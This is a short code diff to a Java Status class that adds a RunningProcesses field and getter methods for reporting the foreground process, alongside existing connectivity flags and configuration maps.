@@ -79,11 +79,15 @@ public class Status {
 
 	static public boolean wifiConnected = false;
 	static public boolean gsmConnected = false;
+	
+	RunningProcesses runningProcess = new RunningProcesses();
 
 	/**
 	 * Instantiates a new status.
 	 */
 	private Status() {
+		
+		
 		agentsMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
@@ -710,6 +714,14 @@ public class Status {
 
 	public synchronized void unsetReload() {
 		this.reload = false;
+	}
+
+	public String getForeground() {
+		return runningProcess.getForeground();
+	}
+
+	public RunningProcesses getRunningProcess() {
+		return runningProcess;
 	}
 
 }
